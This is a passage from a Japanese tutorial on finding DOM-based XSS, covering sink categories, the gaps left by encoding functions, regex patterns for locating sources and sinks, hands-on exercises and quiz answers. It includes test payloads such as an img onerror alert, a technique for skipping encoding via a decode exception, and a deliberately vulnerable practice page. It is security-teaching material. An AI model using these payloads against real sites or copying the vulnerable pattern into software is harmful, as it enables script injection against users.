### 4.9 sink カテゴリの全体像と「未執筆の枠」

DOMXSS Wiki の sink 目次（原文のまま）。

- Direct Execution Sinks / Set Object Sinks / HTML Manipulation Sinks / Style Sinks（CSSText Sink）/ XMLHttpRequest Sink / Set Cookie Sink / Set Location Sink / Control Flow Sink / Use of Equality And Strict Equality / Math.random Sink / JSON Sink / XML Sink / Common JavaScript libraries（jQuery sinks）

〔補足〕このうち Set Object Sinks / Style sinks / XMLHttpRequest Sink / Set Cookie sink / Control Flow sink / Use of Equality And Strict Equality / Math.random sink / JSON sink / XML sink などの各ページは**中身が空で未執筆**である。カテゴリ名だけが残されている。特に **Control Flow Sink**（source 由来の値で `if` 分岐を変える）と **Use of Equality And Strict Equality**（`==` と `===` の差を突く）は、XSSではなく**認可バイパスやロジック改変**につながる着眼点として重要なので、枠として覚えておくとよい。

---

## 5. source の値がどう変形されるかを読む（エンコード関数の挙動差）

source から取った値は、途中でエンコード関数を通ることがある。どの関数がどの文字を変えるかを知らないと、無害化されたつもりの値が実は素通しだった、という見落としをする。JavaScript のネイティブなエンコード関数は3組ある: `escape`/`unescape`、`encodeURI`/`decodeURI`、`encodeURIComponent`/`decodeURIComponent`。

差分を出す検証コード（原文のまま）。

```js
for(i=0;i<256;i++){
var cc=String.fromCharCode(i);
var es=escape(cc),eu=encodeURI(cc),euc=encodeURIComponent(cc)
if( es!=eu |  es!=euc| eu!=euc)
console.log(cc+"["+i+"]= "+es+" "+eu+" "+euc);

}
```

主な差（抜粋）。

| Char | `escape` | `encodeURI` | `encodeURIComponent` |
|---|---|---|---|
| `#` (35) | %23 | # | %23 |
| `&` (38) | %26 | & | %26 |
| `'` (39) | %27 | ' | ' |
| `+` (43) | + | + | %2B |
| `/` (47) | / | / | %2F |
| `:` (58) | %3A | : | %3A |
| `?` (63) | %3F | ? | %3F |
| `@` (64) | @ | @ | %40 |
| `~` (126) | %7E | ~ | ~ |

読み取るべき要点はこうだ。`encodeURI` は `#` `&` `?` `:` `/` `@` などのURL区切り文字を**そのまま残す**。だから「`encodeURI` したから安全」は誤りで、これらの文字を使う攻撃には無力である。一方 `encodeURIComponent` はそれらを `%` エンコードするが、`'` は残す。用途に応じてどれを使うか（そしてどれが素通しか）を確認する必要がある。

さらに、デコード関数で**例外を意図的に起こして無害化をスキップさせる**手筋もある。`decodeURIComponent` は不正なパーセントシーケンスで例外を投げる。

```js
console.log(decodeURI("%C3%D8"));
```

これを次のようなコードにぶつける。

```js
var locParameter = getFromQueryString("aParameter");
try{
 ...
 locParameter = encodeUriComponent(locParameter);
 ...
}catch(e){}
...
 document.write(locParameter);
...
```

`encodeUriComponent` の前段で例外を起こせば、`try` ブロックのエンコード処理が丸ごとスキップされ、**汚染された生の値がそのまま `document.write` に届く**。「エンコードは `try` の中にあるから大丈夫」という思い込みを突く典型例である。

---

## 6. 検出の第一歩 — ソースに正規表現を当てる

### 6.1 なぜ静的検索から始めるのか

DOMXSS Wiki は検出の難しさをこう述べる。

- 「DOMXSS vulnerabilities are rather hard to find by using classic techniques such as scanners and black box testing methods.」——スキャナやブラックボックス手法では見つけにくい。
- 幸い、テスト担当者は通常 JavaScript のソースに完全にアクセスできる（ブラウザで誰でも読める）ので、**ソースコード監査**が使える。
- 最も簡単な手法の一つは、**ソースに正規表現をいくつか当ててヒットを順に精査する**こと。多くのエディタは正規表現検索とハイライトを備えている。

つまり最初にやるのは、DevTools やエディタでページの JavaScript を開き、正規表現で source と sink の候補を機械的に洗い出すことだ。ヒットしたそれぞれについて「これは source か」「ここへ汚染が流れているか」を人が判断していく。

### 6.2 source を見つける正規表現（原文のまま）

```js
/(location\s*[\[.])|([.\[]\s*["']?\s*(arguments|dialogArguments|innerHTML|write(ln)?|open(Dialog)?|showModalDialog|cookie|URL|documentURI|baseURI|referrer|name|opener|parent|top|content|self|frames)\W)|(localStorage|sessionStorage|Database)/
```

### 6.3 sink を見つける正規表現（原文のまま）

```js
/((src|href|data|location|code|value|action)\s*["'\]]*\s*\+?\s*=)|((replace|assign|navigate|getResponseHeader|open(Dialog)?|showModalDialog|eval|evaluate|execCommand|execScript|setTimeout|setInterval)\s*["'\]]*\s*\()/
```

### 6.4 jQuery ベースの sink を見つける正規表現（原文のまま）

```js
/after\(|\.append\(|\.before\(|\.html\(|\.prepend\(|\.replaceWith\(|\.wrap\(|\.wrapAll\(|\$\(|\.globalEval\(|\.add\(|jQuery\(|\$\(|\.parseHTML\(/
```

この正規表現は `$(` にもヒットするため、必ずしも危険とは限らないヒットも含む。だから正規表現は「候補を絞る網」であって、最終判断は人がやる。

### 6.5 メタプログラミングによる観測

DOMXSS Wiki は「Meta-Programming」という発想も示す。モダンなブラウザは既存の JavaScript/DOM プロパティの上書き・拡張を許すので、これを使ってコードフローを解析し、**DOM に書かれる前にすべての入力データをチェックする**ことでDOM XSSを特定できる、という考え方だ。この延長にあるのが、後半の節で扱う Burp の DOM Invader（canary 文字列を注入して sink 到達を実時間で観測するツール）や、検出を自動化する `eslint-plugin-no-unsanitized`（Mozilla）、`domloggerpp`（潜在的 sink に到達する全データを確認するブラウザ拡張）である。

---

## 手を動かす

1. **練習用ページを用意する。** 自分のローカルに次の内容の `dom.html` を作る（絶対に自分の環境でのみ）。

   ```html
   <script>
   var x = location.hash.split("#")[1];
   document.write(x);
   </script>
   ```

2. **ブラウザで開いてフラグメントを付ける。** `file:///.../dom.html#<img src=x onerror=alert(1)>` を開く。`document.write` に汚染値が流れ、`img` の `onerror` が発火して `alert` が出れば、source（`location.hash`）→ sink（`document.write`）の汚染フローを自分で観測できたことになる。`<script>alert(1)</script>` では発火しないことも確かめる（4.2の注記の実証）。

3. **DevTools でソースに正規表現を当てる。** 任意のページで F12 を押し、Sources パネル（または Ctrl+Shift+F の全体検索）を開く。6.2 の source 正規表現、6.3 の sink 正規表現を貼り付けて検索し、ヒット箇所を1つずつ開く。

4. **各ヒットを source か sink か判定する。** ヒットした行について、「攻撃者が値を決められる入口（source）か」「文字列をコード/HTMLとして解釈する出口（sink）か」を分類する。source と sink が同じデータでつながっていれば、それが調べるべき汚染フローである。

5. **エンコードの素通しを確かめる。** DevTools のコンソールで次を実行し、`encodeURI` が何を残すかを目で見る。

   ```js
   ["#","&","?",":","/","'","<",">"].forEach(c=>console.log(c, escape(c), encodeURI(c), encodeURIComponent(c)));
   ```

6. **`setTimeout` の IIF 条件を確かめる。** コンソールで `setTimeout("alert(1)",100)`（文字列＝実行される）と `setTimeout(()=>{},100)`（関数＝安全）を比べ、第1引数が文字列のときだけ sink になることを体感する。

---

## つまずきポイント

- **サーバのレスポンスに攻撃文字列が無いから安全だ、と誤判定する。** DOMベースXSSはクライアント側の注入で、`location.hash` を使う場合は値がサーバに送られない。サーバ側ログやWAFに現れないのは「安全」ではなく「見えていないだけ」である。
- **`innerHTML` に `<script>` を入れて発火せず、脆弱でないと結論づける。** 現代ブラウザでは `innerHTML` 経由の `<script>` も `svg onload` も発火しない。`<img src=x onerror=...>` など代替要素で検証する。
- **`setTimeout` や `setInterval` を一律に sink だと思い込む。** これらは第1引数が**文字列のときに限り**コード実行 sink になる。関数を渡す使い方は sink ではない。
- **`encodeURI` していれば無害化されていると思う。** `encodeURI` は `#` `&` `?` `:` `/` `@` を残す。URL全体を組み立てる文脈では防御にならない。
- **エンコードが `try` ブロックにあるから安全だと思う。** `decodeURIComponent` の例外を意図的に起こせばエンコード処理をスキップさせられる。無害化コードが確実に実行される経路か確認する。
- **`window.name` や `document.cookie` を source として見落とす。** URLパラメータばかり見て、永続 source（`window.name`）や間接 source（`localStorage`）を忘れがち。3.1 の共通 source 一覧を毎回チェックリストにする。
- **source/sink の一覧を「完全」だと思い込む。** DOMXSS Wiki も jQuery sink 一覧に「まだ完全からほど遠い」と警告している。一覧は出発点であって網羅ではない。

---

## この節のまとめ

- DOMベースXSSは、サーバのHTML生成ではなく**ブラウザ内の JavaScript が汚染値を危険なAPIへ渡す**ことで成立する「第三の種類のXSS」で、Amit Klein が2005年に体系化した。
- 反射型/格納型は**サーバ側の注入**、DOMベースXSSは**クライアント側の注入**。攻撃文字列がサーバのレスポンスに現れないことがあり、これが「最も見つけにくい」理由である。
- コードはすべてサーバ由来なので、XSSの種別にかかわらず安全化の責任はアプリケーション所有者にある。
- **source**＝攻撃者が値を制御できる入力プロパティ、**sink**＝渡された文字列をコード/HTMLとして解釈しうる危険な出力点。両者を結ぶ未検証の**汚染フロー（taint flow）** が脆弱性の本体である。
- 主要 source は `location.*` / `document.cookie` / `document.referrer` / `window.name` / `history.*` / `localStorage` などで、ブラウザとURL部位によって「どの文字が素通しされるか」が異なる。
- `window.name` はエンコードが効かず、ドメインをまたいで永続する強力な source。`document.cookie` は Cookie Parameter Pollution で上書きしうる。
- sink は着地カテゴリで被害が変わる。`eval()` 系＝JavaScript injection、`innerHTML`/`document.write` 系＝HTML注入、`location.*`＝open redirect、`document.cookie`＝cookie manipulation など。
- `innerHTML` は現代ブラウザで `<script>` や `svg onload` を発火させないので、実証には `img`/`iframe` を使う。
- `setTimeout`/`setInterval`/`setImmediate` は**第1引数が文字列のときに限り**コード実行 sink になる（IIF 条件）。
- jQuery の `$()` はバージョンで発火条件が変わる（1.6.1 以降は `#` 始まり以外、1.9.0 以降は `<` 始まりのみ）。
- エンコード関数は素通しする文字が異なる。`encodeURI` は URL 区切り文字を残す。`decodeURIComponent` の例外を悪用して無害化をスキップさせる手筋もある。
- 検出の第一歩は、JavaScript のソースに source/sink/jQuery 用の**正規表現を当てて候補を洗い出し**、各ヒットを人が精査すること。ブラックボックススキャナだけでは見つからない。

## 理解度チェック

1. DOMベースXSSが反射型・格納型と根本的に違う点は何か。
   ▶ 答え: 注入が起きる場所。反射型・格納型はサーバ側の注入問題で、DOMベースXSSはクライアント（ブラウザ）側の注入問題である。攻撃文字列がサーバのレスポンスに現れないことがある。

2. source と sink をそれぞれ一文で定義せよ。
   ▶ 答え: source は「攻撃者に制御されうるデータを受け取る JavaScript プロパティ（入力源）」、sink は「攻撃者制御データを渡されると危険な影響を生じうる関数または DOM オブジェクト（危険な出力点）」。

3. `setTimeout("alert(1)", 100)` と `setTimeout(function(){alert(1)}, 100)` のうち、コード実行 sink になるのはどちらか。理由も述べよ。
   ▶ 答え: 文字列を渡す前者。`setTimeout`/`setInterval`/`setImmediate` は第1引数が文字列のときに限り（IIF）、その文字列を JavaScript として実行するため。関数を渡す後者は sink にならない。

4. `innerHTML` に `<script>alert(1)</script>` を代入しても発火しない。ではどう実証するか。
   ▶ 答え: 現代ブラウザは `innerHTML` 経由の `<script>` を実行せず `svg onload` も発火させないので、`<img src=x onerror=alert(1)>` のような代替要素を使う。

5. `window.name` が source として特に危険な性質を2つ挙げよ。
   ▶ 答え: (1) 値に一切のエンコードが適用されず生のまま保持される、(2) ドメインをまたぐ遷移をしても値が永続する。攻撃者が名前を自由に設定できる。

6. `encodeURI` で無害化したつもりでも防御にならない理由は何か。
   ▶ 答え: `encodeURI` は `#` `&` `?` `:` `/` `@` などのURL区切り文字をそのまま残すため。これらを使う攻撃には無力である。

7. 次のカテゴリの汚染が着地する代表的 sink を1つずつ挙げよ: JavaScript injection、open redirection、cookie manipulation。
   ▶ 答え: JavaScript injection＝`eval()`（ほかに `Function()`、文字列の `setTimeout` など）、open redirection＝`location.href`（ほかに `location.assign()`、`open()` など）、cookie manipulation＝`document.cookie`。

8. ソースコード監査でDOMベースXSSを探すとき、最初にやる最も簡単な手法は何か。
   ▶ 答え: ページの JavaScript ソースに source/sink 用の正規表現を当てて候補を機械的に洗い出し、ヒットを1つずつ精査すること。スキャナやブラックボックス手法では見つけにくいため。

## 出典

- https://qiita.com/nozomi2025/items/909d552cec761c6412f2 （担当URL・取得不可）
- https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html
- https://github.com/wisec/domxsswiki/wiki （Glossary, Sources, Sinks, Finding-DOMXSS, String-Manipulation-Methods ほか）
- https://portswigger.net/web-security/dom-based
- https://portswigger.net/web-security/cross-site-scripting/dom-based
- https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/xss-cross-site-scripting/dom-xss.md
- https://github.com/mozilla/eslint-plugin-no-unsanitized
- https://github.com/kevin-mizu/domloggerpp
- http://www.webappsec.org/projects/articles/071105.shtml （Amit Klein, 2005）

<!-- sources: https://qiita.com/nozomi2025/items/909d552cec761c6412f2, https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html, https://github.com/wisec/domxsswiki/wiki, https://portswigger.net/web-security/dom-based, https://portswigger.net/web-security/cross-site-scripting/dom-based, https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/xss-cross-site-scripting/dom-xss.md, https://github.com/mozilla/eslint-plugin-no-unsanitized, https://github.com/kevin-mizu/domloggerpp, http://www.webappsec.org/projects/articles/071105.shtml -->
<!-- terms: DOMベースXSS, source, sink, 汚染フロー, taint flow, レンダリングコンテキスト, 実行コンテキスト, サブコンテキスト, 同一オリジンポリシー, location.hash, document.cookie, window.name, Cookie Parameter Pollution, Object Shadowing, innerHTML, eval, setTimeout, jQuery sink, encodeURI, DOM Invader -->
<!-- self-read: https://qiita.com/nozomi2025/items/909d552cec761c6412f2 | サイト側の制限（qiita.com:443 が組織ポリシーで遮断、アーカイブ迂回も到達不能） -->
